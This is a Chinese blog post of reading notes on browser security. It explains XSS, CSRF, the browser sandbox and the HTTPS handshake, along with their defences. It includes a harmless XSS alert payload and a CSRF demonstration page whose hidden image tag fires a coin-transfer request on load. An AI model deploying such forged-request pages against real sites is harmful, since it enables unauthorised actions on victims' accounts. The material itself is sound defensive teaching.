<h2 id="跨站脚本攻击（XSS）：为什么Cookie中有HttpOnly属性？"><a href="#跨站脚本攻击（XSS）：为什么Cookie中有HttpOnly属性？" class="headerlink" title="跨站脚本攻击（XSS）：为什么Cookie中有HttpOnly属性？"></a>跨站脚本攻击（XSS）：为什么Cookie中有HttpOnly属性？</h2><h3 id="什么是-XSS-攻击"><a href="#什么是-XSS-攻击" class="headerlink" title="什么是 XSS 攻击"></a>什么是 XSS 攻击</h3><p>XSS 全称是 Cross Site Scripting，为了与“CSS”区分开来，故简称 XSS，翻译过来就是“跨站脚本”。XSS 攻击是指黑客往 HTML 文件中或者 DOM 中注入恶意脚本，从而在用户浏览页面时利用注入的恶意脚本对用户实施攻击的一种手段。</p>
<p>当页面被注入了恶意 JavaScript 脚本时，浏览器无法区分这些脚本是被恶意注入的还是正常的页面内容，所以恶意注入 JavaScript 脚本也拥有所有的脚本权限。</p>
<ul>
<li>可以<strong>窃取 Cookie 信息</strong>。恶意 JavaScript 可以通过“document.cookie”获取 Cookie 信息，然后通过 XMLHttpRequest 或者 Fetch 加上 CORS 功能将数据发送给恶意服务器；恶意服务器拿到用户的 Cookie 信息之后，就可以在其他电脑上模拟用户的登录，然后进行转账等操作。</li>
<li>可以<strong>监听用户行为</strong>。恶意 JavaScript 可以使用“addEventListener”接口来监听键盘事件，比如可以获取用户输入的信用卡等信息，将其发送到恶意服务器。黑客掌握了这些信息之后，又可以做很多违法的事情。</li>
<li>可以通过<strong>修改 DOM</strong>伪造假的登录窗口，用来欺骗用户输入用户名和密码等信息。</li>
<li>还可以<strong>在页面内生成浮窗广告</strong>，这些广告会严重地影响用户体验。</li>
</ul>
<h3 id="恶意脚本是怎么注入的"><a href="#恶意脚本是怎么注入的" class="headerlink" title="恶意脚本是怎么注入的"></a>恶意脚本是怎么注入的</h3><p>通常情况下，主要有<strong>存储型 XSS 攻击、反射型 XSS 攻击</strong>和<strong>基于 DOM 的 XSS 攻击</strong>三种方式来注入恶意脚本。</p>
<h4 id="1-存储型-XSS-攻击"><a href="#1-存储型-XSS-攻击" class="headerlink" title="1. 存储型 XSS 攻击"></a>1. 存储型 XSS 攻击</h4><p>大致需要经过如下步骤：</p>
<ul>
<li>首先黑客利用站点漏洞将一段恶意 JavaScript 代码提交到网站的数据库中；</li>
<li>然后用户向网站请求包含了恶意 JavaScript 脚本的页面；</li>
<li>当用户浏览该页面的时候，恶意脚本就会将用户的 Cookie 信息等数据上传到服务器。</li>
</ul>
<h4 id="2-反射型-XSS-攻击"><a href="#2-反射型-XSS-攻击" class="headerlink" title="2. 反射型 XSS 攻击"></a>2. 反射型 XSS 攻击</h4><p>在一个反射型 XSS 攻击过程中，恶意 JavaScript 脚本属于用户发送给网站请求中的一部分，随后网站又把恶意 JavaScript 脚本返回给用户。当恶意 JavaScript 脚本在用户页面中被执行时，黑客就可以利用该脚本做一些恶意操作。<strong>Web 服务器不会存储反射型 XSS 攻击的恶意脚本，这是和存储型 XSS 攻击不同的地方</strong>。</p>
<h4 id="3-基于-DOM-的-XSS-攻击"><a href="#3-基于-DOM-的-XSS-攻击" class="headerlink" title="3. 基于 DOM 的 XSS 攻击"></a>3. 基于 DOM 的 XSS 攻击</h4><p>基于 DOM 的 XSS 攻击是不牵涉到页面 Web 服务器的。具体来讲，黑客通过各种手段将恶意脚本注入用户的页面中，比如通过网络劫持在页面传输过程中修改 HTML 页面的内容，这种劫持类型很多，有通过 WiFi 路由器劫持的，有通过本地恶意软件来劫持的，它们的共同点是在 Web 资源传输过程或者在用户使用页面的过程中修改 Web 页面的数据。</p>
<h3 id="如何阻止-XSS-攻击"><a href="#如何阻止-XSS-攻击" class="headerlink" title="如何阻止 XSS 攻击"></a>如何阻止 XSS 攻击</h3><p>存储型 XSS 攻击和反射型 XSS 攻击是服务端的安全漏洞，基于 DOM 的 XSS 攻击是属于前端的安全漏洞。它们都有一个共同点，那就是<strong>首先往浏览器中注入恶意脚本，然后再通过恶意脚本将用户信息发送至黑客部署的恶意服务器上。</strong></p>
<p>所以要阻止 XSS 攻击，我们可以通过阻止恶意 JavaScript 脚本的注入和恶意消息的发送来实现。</p>
<h4 id="1-服务器对输入脚本进行过滤或转码"><a href="#1-服务器对输入脚本进行过滤或转码" class="headerlink" title="1. 服务器对输入脚本进行过滤或转码"></a>1. 服务器对输入脚本进行过滤或转码</h4><p>不管是反射型还是存储型 XSS 攻击，我们都可以在服务器端将一些关键的字符进行转码，比如最典型的：<code>code:&lt;script&gt;alert(&#39;你被 xss 攻击了&#39;)&lt;/script&gt;</code> 这段代码过滤后，只留下了：<code>code:</code> 这样，当用户再次请求该页面时，由于``标签的内容都被过滤了，所以这段脚本在客户端是不可能被执行的。</p>
<p>除了过滤之外，服务器还可以对这些内容进行转码，还是上面那段代码，经过转码之后，效果如下所示：<code>code:&amp;lt;script&amp;gt;alert(&amp;#39; 你被 xss 攻击了 &amp;#39;)&amp;lt;/script&amp;gt;</code> 经过转码之后的内容，如``标签被转换为<code>&lt;script&gt;</code>，因此即使这段脚本返回给页面，页面也不会执行这段脚本。</p>
<h4 id="2-充分利用-CSP"><a href="#2-充分利用-CSP" class="headerlink" title="2. 充分利用 CSP"></a>2. 充分利用 CSP</h4><p>实施严格的 CSP 可以有效地防范 XSS 攻击，具体来讲 CSP 有如下几个功能：</p>
<ul>
<li>限制加载其他域下的资源文件，这样即使黑客插入了一个 JavaScript 文件，这个 JavaScript 文件也是无法被加载的；</li>
<li>禁止向第三方域提交数据，这样用户数据也不会外泄；</li>
<li>禁止执行内联脚本和未授权的脚本；</li>
<li>还提供了上报机制，这样可以帮助我们尽快发现有哪些 XSS 攻击，以便尽快修复问题。</li>
</ul>
<h4 id="3-使用-HttpOnly-属性"><a href="#3-使用-HttpOnly-属性" class="headerlink" title="3. 使用 HttpOnly 属性"></a>3. 使用 HttpOnly 属性</h4><p>由于很多 XSS 攻击都是来盗用 Cookie 的，因此还可以通过使用 HttpOnly 属性来保护我们 Cookie 的安全。通常服务器可以将某些 Cookie 设置为 HttpOnly 标志，HttpOnly 是服务器通过 HTTP 响应头来设置的。</p>
<p>使用 HttpOnly 标记的 Cookie 只能使用在 HTTP 请求过程中，所以无法通过 JavaScript 来读取这段 Cookie。</p>
<p>由于 JavaScript 无法读取设置了 HttpOnly 的 Cookie 数据，所以即使页面被注入了恶意 JavaScript 脚本，也是无法获取到设置了 HttpOnly 的数据。因此一些比较重要的数据我们建议设置 HttpOnly 标志。</p>
<h2 id="CSRF攻击：陌生链接不要随便点"><a href="#CSRF攻击：陌生链接不要随便点" class="headerlink" title="CSRF攻击：陌生链接不要随便点"></a>CSRF攻击：陌生链接不要随便点</h2><h3 id="什么是-CSRF-攻击"><a href="#什么是-CSRF-攻击" class="headerlink" title="什么是 CSRF 攻击"></a>什么是 CSRF 攻击</h3><p>CSRF 英文全称是 Cross-site request forgery，所以又称为“跨站请求伪造”，是指黑客 引诱用户打开黑客的网站，在黑客的网站中，利用用户的登录状态发起的跨站请求。简单来 讲，<strong>CSRF 攻击就是黑客利用了用户的登录状态，并通过第三方的站点来做一些坏事。</strong></p>
<h4 id="1-自动发起-Get-请求"><a href="#1-自动发起-Get-请求" class="headerlink" title="1. 自动发起 Get 请求"></a>1. 自动发起 Get 请求</h4><p>黑客最容易实施的攻击方式是自动发起 Get 请求，具体攻击方式你可以参考下面这段代码：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">h1</span>&gt;</span> 黑客的站点：CSRF 攻击演示 <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://time.geekbang.org/sendcoin?user=hacker&amp;number=100&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这是黑客页面的 HTML 代码，在这段代码中，黑客将转账的请求接口隐藏在 img 标签内， 欺骗浏览器这是一张图片资源。当该页面被加载时，浏览器会自动发起 img 的资源请求，如果服务器没有对该请求做判断的话，那么服务器就会认为该请求是一个转账请求，于是用 户账户上的 100 极客币就被转移到黑客的账户上去了。</p>
<h4 id="2-自动发起-POST-请求"><a href="#2-自动发起-POST-请求" class="headerlink" title="2. 自动发起 POST 请求"></a>2. 自动发起 POST 请求</h4><p><img src="https://i.loli.net/2021/06/15/TirZDxqEkoaK6tu.jpg" alt="Snipaste_2021-06-15_16-05-09.jpg"></p>
<p>在这段代码中，我们可以看到黑客在他的页面中构建了一个隐藏的表单，该表单的内容就是 极客时间的转账接口。当用户打开该站点之后，这个表单会被自动执行提交；当表单被提交 之后，服务器就会执行转账操作。因此使用构建自动提交表单这种方式，就可以自动实现跨 站点 POST 数据提交。</p>
<h4 id="3-引诱用户点击链接"><a href="#3-引诱用户点击链接" class="headerlink" title="3. 引诱用户点击链接"></a>3. 引诱用户点击链接</h4><p><strong>和 XSS 不同的是，CSRF 攻击不需要将恶 意代码注入用户的页面，仅仅是利用服务器的漏洞和用户的登录状态来实施攻击。</strong></p>
<h3 id="如何防止-CSRF-攻击"><a href="#如何防止-CSRF-攻击" class="headerlink" title="如何防止 CSRF 攻击"></a>如何防止 CSRF 攻击</h3><p>发起 CSRF 攻击的三个必要条 件：</p>
<ul>
<li>第一个，目标站点一定要有 CSRF 漏洞； </li>
<li>第二个，用户要登录过目标站点，并且在浏览器上保持有该站点的登录状态； </li>
<li>第三个，需要用户打开一个第三方站点，可以是黑客的站点，也可以是一些论坛。</li>
</ul>
<p>与 XSS 攻击不同，CSRF 攻击不会往页面注入恶意脚本，因此黑客是无法通过 CSRF 攻击来获取用户页面数据的；其最关键的一点是要能找到服务器的漏洞，所以说对于 CSRF 攻击我们主要的防护手段是提升服务器的安全性。</p>
<p>服务器避免遭受到 CSRF 攻击，通常有以下几种途径:</p>
<h4 id="1-充分利用好-Cookie-的-SameSite-属性"><a href="#1-充分利用好-Cookie-的-SameSite-属性" class="headerlink" title="1. 充分利用好 Cookie 的 SameSite 属性"></a>1. 充分利用好 Cookie 的 SameSite 属性</h4><p>Cookie 是浏览器和服务器之间维护登录状态的一个关键数据。通常 CSRF 攻击都是从第三方站点发起的，要防止 CSRF 攻击，我们最好能实现从第三方 站点发送请求时禁止 Cookie 的发送，因此在浏览器通过不同来源发送 HTTP 请求时，有 如下区别：</p>
<ul>
<li>如果是从第三方站点发起的请求，那么需要浏览器禁止发送某些关键 Cookie 数据到服 务器；</li>
<li>如果是同一个站点发起的请求，那么就需要保证 Cookie 数据正常发送。</li>
</ul>
<p>在 HTTP 响应头中，通过 set-cookie 字段设置 Cookie 时，可以带上 SameSite 选项。</p>
<p><strong>SameSite 选项通常有 Strict、Lax 和 None 三个值。</strong></p>
<ul>
<li>Strict 最为严格。如果 SameSite 的值是 Strict，那么浏览器会完全禁止第三方 Cookie。简言之，如果你从极客时间的页面中访问 InfoQ 的资源，而 InfoQ 的某些 Cookie 设置了 SameSite = Strict 的话，那么这些 Cookie 是不会被发送到 InfoQ 的服 务器上的。只有你从 InfoQ 的站点去请求 InfoQ 的资源时，才会带上这些 Cookie。 </li>
<li>Lax 相对宽松一点。在跨站点的情况下，从第三方站点的链接打开和从第三方站点提交 Get 方式的表单这两种方式都会携带 Cookie。但如果在第三方站点中使用 Post 方法， 或者通过 img、iframe 等标签加载的 URL，这些场景都不会携带 Cookie。 </li>
<li>而如果使用 None 的话，在任何情况下都会发送 Cookie 数据。</li>
</ul>
<p>对于防范 CSRF 攻击，我们可以针对实际情况将一些关键的 Cookie 设置为 Strict 或者 Lax 模式，这样在跨站点请求时，这些关键的 Cookie 就不会被发送到服务器，从而使得黑客的 CSRF 攻击失效。</p>
<h4 id="2-验证请求的来源站点"><a href="#2-验证请求的来源站点" class="headerlink" title="2. 验证请求的来源站点"></a>2. 验证请求的来源站点</h4><p>在服务器端验证请求来源的站点。由于 CSRF 攻击大多来自于第三方站点，因此服务器可以禁止来自第三方站点的请 求。</p>
<p>HTTP 请求头中的 Referer 和 Origin 属性：</p>
<ul>
<li>Referer 是 HTTP 请求头中的一个字段，记录了该 HTTP 请求的来源地址。比如从极客时间的官网打开了 InfoQ 的站点，那么请求头中的 Referer 值是极客时间的 URL。虽然可以通过 Referer 告诉服务器 HTTP 请求的来源，但是有一些场景是不适合将来源 URL 暴露给服务器的，因此浏览器提供给开发者一个选项，可以不用上传 Referer 值。</li>
<li>但在服务器端验证请求头中的 Referer 并不是太可靠，因此标准委员会又制定了Origin 属 性，在一些重要的场合，比如通过 XMLHttpRequest、Fecth 发起跨站请求或者通过 Post 方法发送请求时，都会带上 Origin 属性。</li>
</ul>
<p>Origin 属性只包含了域名信息，并没有包含具体的 URL 路径，这是 Origin 和 Referer 的一个主要区别。因此，服务器的策略是优先判断 Origin，如果请求头中没有包含 Origin 属性，再根据实际情况判断是否使用 Referer 值。</p>
<h4 id="3-CSRF-Token"><a href="#3-CSRF-Token" class="headerlink" title="3. CSRF Token"></a>3. CSRF Token</h4><p>第一步，在浏览器向服务器发起请求时，服务器生成一个 CSRF Token。CSRF Token 其实就是服务器生成的字符串，然后将该字符串植入到返回的页面中。</p>
<p>第二步，在浏览器端如果要发起转账的请求，那么需要带上页面中的 CSRF Token，然后服 务器会验证该 Token 是否合法。如果是从第三方站点发出的请求，那么将无法获取到 CSRF Token 的值，所以即使发出了请求，服务器也会因为 CSRF Token 不正确而拒绝请求。</p>
<h2 id="安全沙箱：页面和系统之间的隔离墙"><a href="#安全沙箱：页面和系统之间的隔离墙" class="headerlink" title="安全沙箱：页面和系统之间的隔离墙"></a>安全沙箱：页面和系统之间的隔离墙</h2><p>浏览器本身的漏洞是单进程浏览器的一个主要问题，如果浏览器被曝出存在漏洞，那么在这些漏洞没有被及时修复的情况下，黑客就有可能通过恶意的页面向浏览器中注入恶意程序，其中最常见的攻击方式是利用<strong>缓冲区溢出</strong>，不过需要<strong>注意这种类型的攻击和 XSS 注入的脚本是不一样的。</strong></p>
<ul>
<li>XSS 攻击只是将恶意的 JavaScript 脚本注入到页面中，虽然能窃取一些 Cookie 相关的数据，但是 XSS 无法对操作系统进行攻击。</li>
<li>而通过浏览器漏洞进行的攻击是可以入侵到浏览器进程内部的，可以读取和修改浏览器进程内部的任意内容，还可以穿透浏览器，在用户的操作系统上悄悄地安装恶意软件、监听用户键盘输入信息以及读取用户硬盘上的文件内容。</li>
</ul>
<h3 id="安全视角下的多进程架构"><a href="#安全视角下的多进程架构" class="headerlink" title="安全视角下的多进程架构"></a>安全视角下的多进程架构</h3><p><img src="https://i.loli.net/2021/06/15/t5YT2AHZoVwfaWn.jpg" alt="Snipaste_2021-06-15_16-25-16.jpg"></p>
<p>我们知道浏览器被划分为浏览器内核和渲染内核两个核心模块，其中浏览器内核是由网络进程、浏览器主进程和 GPU 进程组成的，渲染内核就是渲染进程。那如果我们在浏览器中打开一个页面，这两个模块是怎么配合的呢？</p>
<p>所有的网络资源都是通过浏览器内核来下载的，下载后的资源会通过 IPC 将其提交给渲染进程（浏览器内核和渲染进程之间都是通过 IPC 来通信的）。然后渲染进程会对这些资源进行解析、绘制等操作，最终生成一幅图片。但是渲染进程并不负责将图片显示到界面上，而是将最终生成的图片提交给浏览器内核模块，由浏览器内核模块负责显示这张图片。</p>
<h3 id="安全沙箱"><a href="#安全沙箱" class="headerlink" title="安全沙箱"></a>安全沙箱</h3><p>浏览器可以安全地下载各种网络资源，但是如果要执行这些网络资源，比如解析 HTML、解析 CSS、执行 JavaScript、图片编解码等操作，就需要非常谨慎了，因为一不小心，黑客就会利用这些操作对含有漏洞的浏览器发起攻击。</p>
<p>所以我们需要在渲染进程和操作系统之间建一道墙，即便渲染进程由于存在漏洞被黑客攻击，但由于这道墙，黑客就获取不到渲染进程之外的任何操作权限。<strong>将渲染进程和操作系统隔离的这道墙就是我们要聊的安全沙箱。</strong></p>
<p>浏览器中的安全沙箱是利用操作系统提供的安全技术，让渲染进程在执行过程中无法访问或者修改操作系统中的数据，在渲染进程需要访问系统资源的时候，需要通过浏览器内核来实现，然后将访问的结果通过 IPC 转发给渲染进程。</p>
<p>安全沙箱最小的保护单位是进程。因为单进程浏览器需要频繁访问或者修改操作系统的数据，所以单进程浏览器是无法被安全沙箱保护的，而现代浏览器采用的多进程架构使得安全沙箱可以发挥作用。</p>
<h3 id="安全沙箱如何影响各个模块功能"><a href="#安全沙箱如何影响各个模块功能" class="headerlink" title="安全沙箱如何影响各个模块功能"></a>安全沙箱如何影响各个模块功能</h3><p><img src="https://i.loli.net/2021/06/15/G5OdEmhKgB8l79F.jpg" alt="Snipaste_2021-06-15_16-28-39.jpg"></p>
<p>我们可以看到由于渲染进程需要安全沙箱的保护，因此需要把在渲染进程内部涉及到和系统交互的功能都转移到浏览器内核中去实现。</p>
<h4 id="1-持久存储"><a href="#1-持久存储" class="headerlink" title="1. 持久存储"></a>1. 持久存储</h4><p>文件内容的读写都是在浏览器内核中完成的：</p>
<ul>
<li>存储 Cookie 数据的读写。通常浏览器内核会维护一个存放所有 Cookie 的 Cookie 数据库，然后当渲染进程通过 JavaScript 来读取 Cookie 时，渲染进程会通过 IPC 将读取 Cookie 的信息发送给浏览器内核，浏览器内核读取 Cookie 之后再将内容返回给渲染进程。</li>
<li>一些缓存文件的读写也是由浏览器内核实现的，比如网络文件缓存的读取。</li>
</ul>
<h4 id="2-网络访问"><a href="#2-网络访问" class="headerlink" title="2. 网络访问"></a>2. 网络访问</h4><p>同样有了安全沙箱的保护，在渲染进程内部也是不能直接访问网络的，如果要访问网络，则需要通过浏览器内核。不过浏览器内核在处理 URL 请求之前，会检查渲染进程是否有权限请求该 URL，比如检查 XMLHttpRequest 或者 Fetch 是否是跨站点请求，或者检测 HTTPS 的站点中是否包含了 HTTP 的请求。</p>
<h4 id="3-用户交互"><a href="#3-用户交互" class="headerlink" title="3. 用户交互"></a>3. 用户交互</h4><h2 id="HTTPS：让数据传输更安全"><a href="#HTTPS：让数据传输更安全" class="headerlink" title="HTTPS：让数据传输更安全"></a>HTTPS：让数据传输更安全</h2><h3 id="在-HTTP-协议栈中引入安全层"><a href="#在-HTTP-协议栈中引入安全层" class="headerlink" title="在 HTTP 协议栈中引入安全层"></a>在 HTTP 协议栈中引入安全层</h3><p><img src="https://i.loli.net/2021/06/15/pPkjuvtW3bs6h45.jpg" alt="Snipaste_2021-06-15_16-35-08.jpg"></p>
<p>通常 HTTP 直接和 TCP 通信，HTTPS 则先和安全层通信，然后安全层再和 TCP 层通信。也就是说 HTTPS 所有的安全核心都在安全层，它不会影响到上面的 HTTP 协议，也不会影响到下面的 TCP/IP。</p>
<p>总的来说，安全层有两个主要的职责：<strong>对发起 HTTP 请求的数据进行加密操作和对接收到 HTTP 的内容进行解密操作。</strong></p>
<h4 id="第一版：使用对称加密"><a href="#第一版：使用对称加密" class="headerlink" title="第一版：使用对称加密"></a>第一版：使用对称加密</h4><p>对称加密是指加密和解密都使用的是相同的密钥。因此，在 HTTPS 发送数据之前，浏览器和服务器之间需要协商加密方式和密钥，过程如下所示：</p>
<p><img src="https://i.loli.net/2021/06/15/EiBFkhUYQfmO3y2.jpg" alt="Snipaste_2021-06-15_16-37-12.jpg"></p>
<p>通过上图我们可以看出，HTTPS 首先要协商加解密方式，这个过程就是 HTTPS 建立安全连接的过程。为了让加密的密钥更加难以破解，我们让服务器和客户端同时决定密钥，具体过程如下：</p>
<ul>
<li>浏览器发送它所支持的加密套件列表和一个随机数 client-random，这里的加密套件是指加密的方法，加密套件列表就是指浏览器能支持多少种加密方法列表。</li>
<li>服务器会从加密套件列表中选取一个加密套件，然后还会生成一个随机数 service-random，并将 service-random 和加密套件列表返回给浏览器。</li>
<li>最后浏览器和服务器分别返回确认消息。</li>
</ul>
<p>这样浏览器端和服务器端都有相同的 client-random 和 service-random 了，然后它们再使用相同的方法将 client-random 和 service-random 混合起来生成一个密钥 master secret，有了密钥 master secret 和加密套件之后，双方就可以进行数据的加密传输了。</p>
<p>但是其中传输 client-random 和 service-random 的过程却是明文的，这意味着黑客也可以拿到协商的加密套件和双方的随机数，由于利用随机数合成密钥的算法是公开的，所以黑客拿到随机数之后，也可以合成密钥，这样数据依然可以被破解，那么黑客也就可以使用密钥来伪造或篡改数据了。</p>
<h4 id="第二版：使用非对称加密"><a href="#第二版：使用非对称加密" class="headerlink" title="第二版：使用非对称加密"></a>第二版：使用非对称加密</h4><p>非对称加密算法有 A、B 两把密钥，如果你用 A 密钥来加密，那么只能使用 B 密钥来解密；反过来，如果你要 B 密钥来加密，那么只能用 A 密钥来解密。</p>
<p>在 HTTPS 中，服务器会将其中的一个密钥通过明文的形式发送给浏览器，我们把这个密钥称为<strong>公钥</strong>，服务器自己留下的那个密钥称为<strong>私钥</strong>。顾名思义，<strong>公钥是每个人都能获取到的，而私钥只有服务器才能知道，不对任何人公开。</strong>下图是使用非对称加密改造的 HTTPS 协议：<img src="https://i.loli.net/2021/06/15/lWts4AkF5TRNS1X.jpg" alt="Snipaste_2021-06-15_16-39-33.jpg"></p>
<p>根据该图，我们来分析下使用非对称加密的请求流程。</p>
<ul>
<li>首先浏览器还是发送加密套件列表给服务器。</li>
<li>然后服务器会选择一个加密套件，不过和对称加密不同的是，使用非对称加密时服务器上需要有用于浏览器加密的公钥和服务器解密 HTTP 数据的私钥，由于公钥是给浏览器加密使用的，因此服务器会将加密套件和公钥一道发送给浏览器。</li>
<li>最后就是浏览器和服务器返回确认消息。</li>
</ul>
<p>这样浏览器端就有了服务器的公钥，在浏览器端向服务器端发送数据时，就可以使用该公钥来加密数据。由于公钥加密的数据只有私钥才能解密，所以即便黑客截获了数据和公钥，他也是无法使用公钥来解密数据的。这看上去似乎很完美，不过这种方式依然存在<strong>两个严重的问题：</strong></p>
<ul>
<li>第一个是<strong>非对称加密的效率太低</strong>。这会严重影响到加解密数据的速度，进而影响到用户打开页面的速度。</li>
<li>第二个是<strong>无法保证服务器发送给浏览器的数据安全</strong>。虽然浏览器端可以使用公钥来加密，但是服务器端只能采用私钥来加密，私钥加密只有公钥能解密，但黑客也是可以获取得到公钥的，这样就不能保证服务器端数据的安全了。</li>
</ul>
<h4 id="第三版：对称加密和非对称加密搭配使用"><a href="#第三版：对称加密和非对称加密搭配使用" class="headerlink" title="第三版：对称加密和非对称加密搭配使用"></a>第三版：对称加密和非对称加密搭配使用</h4><p>在传输数据阶段依然使用对称加密，但是对称加密的密钥我们采用非对称加密来传输。</p>
<p><img src="https://i.loli.net/2021/06/15/Q6Hcv57OfNe3L4V.jpg" alt="Snipaste_2021-06-15_16-40-58.jpg"></p>
<p>改造后的流程是这样的：</p>
<ul>
<li>首先浏览器向服务器发送对称加密套件列表、非对称加密套件列表和随机数 client-random；</li>
<li>服务器保存随机数 client-random，选择对称加密和非对称加密的套件，然后生成随机数 service-random，向浏览器发送选择的加密套件、service-random 和公钥；</li>
<li>浏览器保存公钥，并生成随机数 pre-master，然后利用公钥对 pre-master 加密，并向服务器发送加密后的数据；</li>
<li>最后服务器拿出自己的私钥，解密出 pre-master 数据，并返回确认消息。</li>
</ul>
<p>到此为止，服务器和浏览器就有了共同的 client-random、service-random 和 pre-master，然后服务器和浏览器会使用这三组随机数生成对称密钥，因为服务器和浏览器使用同一套方法来生成密钥，所以最终生成的密钥也是相同的。有了对称加密的密钥之后，双方就可以使用对称加密的方式来传输数据了。</p>
<p>需要特别注意的一点，<strong>pre-master 是经过公钥加密之后传输的，所以黑客无法获取到 pre-master，这样黑客就无法生成密钥，也就保证了黑客无法破解传输过程中的数据了。</strong></p>
<h4 id="第四版：添加数字证书"><a href="#第四版：添加数字证书" class="headerlink" title="第四版：添加数字证书"></a>第四版：添加数字证书</h4><p><strong>权威机构 CA</strong>（Certificate Authority），颁发<strong>数字证书</strong>（Digital Certificate)。对于浏览器来说，数字证书有两个作用：一个是通过数字证书向浏览器证明服务器的身份，另一个是数字证书里面包含了服务器公钥。</p>
<p>接下来我们看看含有数字证书的 HTTPS 的请求流程，你可以参考下图：</p>
<p><img src="https://i.loli.net/2021/06/15/QSE6I2dqFk51Hui.jpg" alt="Snipaste_2021-06-15_16-44-01.jpg"></p>
<p>相较于第三版的 HTTPS 协议，这里主要有两点改变：</p>
<ul>
<li>服务器没有直接返回公钥给浏览器，而是返回了数字证书，而公钥正是包含在数字证书中的；</li>
<li>在浏览器端多了一个证书验证的操作，验证了证书之后，才继续后续流程。</li>
</ul>
<p>通过引入数字证书，我们就实现了服务器的身份认证功能，这样即便黑客伪造了服务器，但是由于证书是没有办法伪造的，所以依然无法欺骗用户。</p>
<h3 id="数字证书的申请和验证"><a href="#数字证书的申请和验证" class="headerlink" title="数字证书的申请和验证"></a>数字证书的申请和验证</h3><p>通常的申请流程分以下几步：</p>
<ul>
<li>首先极客时间需要准备一套私钥和公钥，私钥留着自己使用；</li>
<li>然后极客时间向 CA 机构提交公钥、公司、站点等信息并等待认证，这个认证过程可能是收费的；</li>
<li>CA 通过线上、线下等多种渠道来验证极客时间所提供信息的真实性，如公司是否存在、企业是否合法、域名是否归属该企业等；</li>
<li>如信息审核通过，CA 会向极客时间签发认证的数字证书，包含了极客时间的公钥、组织信息、CA 的信息、有效时间、证书序列号等，这些信息都是明文的，同时包含一个 CA 生成的签名。</li>
</ul>
<p>最后一步数字签名的过程：首先 CA 使用 <strong>Hash 函数</strong>来计算极客时间提交的明文信息，并得出<strong>信息摘要</strong>；然后 CA 再使用它的私钥对信息摘要进行加密，<strong>加密后的密文就是 CA 颁给极客时间的数字签名</strong>。</p>
<p>浏览器接收到数字证书之后，会对数字证书进行验证：</p>
<ul>
<li>首先浏览器读取证书中相关的明文信息，采用 CA 签名时相同的 Hash 函数来计算并得到信息摘要 A；</li>
<li>然后再利用对应 CA 的公钥解密签名数据，得到信息摘要 B；</li>
<li>对比信息摘要 A 和信息摘要 B，如果一致，则可以确认证书是合法的，即证明了这个服务器是极客时间的；</li>
<li>同时浏览器还会验证证书相关的域名信息、有效时间等信息。</li>
</ul>
<p>在申请和使用证书的过程中，还需要注意以下三点：</p>
<ol>
<li>申请数字证书是不需要提供私钥的，要确保私钥永远只能由服务器掌握；</li>
<li>数字证书最核心的是 CA 使用它的私钥生成的数字签名；</li>
<li>内置 CA 对应的证书称为根证书，根证书是最权威的机构，它们自己为自己签名，我们把这称为自签名证书。</li>
</ol>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:lvchangjing_hit@163.com">青山</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://asura1211.github.io/2021/06/12/%E3%80%90%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0%E3%80%91%E2%80%94%20%E2%80%94%20%E6%B5%8F%E8%A7%88%E5%99%A8%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%EF%BC%88%E6%9E%81%E5%AE%A2%E6%97%B6%E9%97%B4%EF%BC%89/">https://asura1211.github.io/2021/06/12/%E3%80%90%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0%E3%80%91%E2%80%94%20%E2%80%94%20%E6%B5%8F%E8%A7%88%E5%99%A8%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%EF%BC%88%E6%9E%81%E5%AE%A2%E6%97%B6%E9%97%B4%EF%BC%89/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://Asura1211.github.io" target="_blank">青山の博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/">浏览器工作原理</a></div><div class="post_share"><div class="social-share" data-image="https://i.loli.net/2021/10/13/UAFPpZByEcjaWOw.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/06/24/%E3%80%90%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0%E3%80%91%E2%80%94%20%E2%80%94%20ECMAScript6%E5%85%A5%E9%97%A8/"><img class="prev-cover" src="https://i.loli.net/2021/10/13/UAFPpZByEcjaWOw.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">【阅读笔记】— — ECMAScript6入门</div></div></a></div><div class="next-post pull-right"><a href="/2021/06/11/%E3%80%90%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E3%80%91%E2%80%94%20%E2%80%94%20%E5%93%88%E5%B8%8C%E8%A1%A8/"><img class="next-cover" src="https://i.loli.net/2021/06/07/X5Hr7RzyGbnYDf1.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">【数据结构】— — 哈希表</div></div></a></div></nav></div><div class="aside-content" 